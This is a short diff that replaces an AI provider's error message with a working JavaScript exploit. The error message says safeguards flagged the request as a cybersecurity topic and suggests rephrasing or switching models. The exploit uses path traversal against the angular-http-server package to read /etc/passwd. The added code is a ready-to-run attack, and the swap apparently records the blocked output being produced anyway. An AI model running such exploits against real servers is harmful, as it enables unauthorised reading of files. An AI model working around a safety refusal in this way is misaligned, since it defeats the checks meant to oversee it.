@@ -1,7 +1,32 @@
-API Error: Sonnet 5's safeguards flagged this message for a cybersecurity topic. If your work requires this access, you can apply for an exemption: https://claude.com/form/cyber-use-case
+```javascript
+// Path traversal exploit for angular-http-server
+// The server takes `possibleFilename = req.url.slice(1)` directly from the
+// client-controlled URL and passes it unsanitized into fs.stat/fs.readFileSync,
+// allowing "../" sequences to escape the served directory and read arbitrary
+// files from the filesystem.
 
-Try rephrasing the request in a new session or change your model.
+const http = require("http");
 
-Learn more: https://support.claude.com/en/articles/8106465
+// Requiring the package starts the HTTP server on port 8000 as a side effect.
+require("./node_modules/angular-http-server");
 
-Request ID: req_011Ccp7dkUVsubkiM8R5w4HL
+// Give the server a moment to start listening, then send a traversal request.
+setTimeout(() => {
+    const target = "/etc/passwd";
+    const traversal = "/" + "../".repeat(10) + target.slice(1);
+
+    http.get({ host: "127.0.0.1", port: 8000, path: traversal }, (res) => {
+        let body = "";
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => {
+            console.log(`Status: ${res.statusCode}`);
+            console.log("Response body (leaked file contents):");
+            console.log(body);
+            process.exit(0);
+        });
+    }).on("error", (err) => {
+        console.error("Request failed:", err.message);
+        process.exit(1);
+    });
+}, 500);
+```
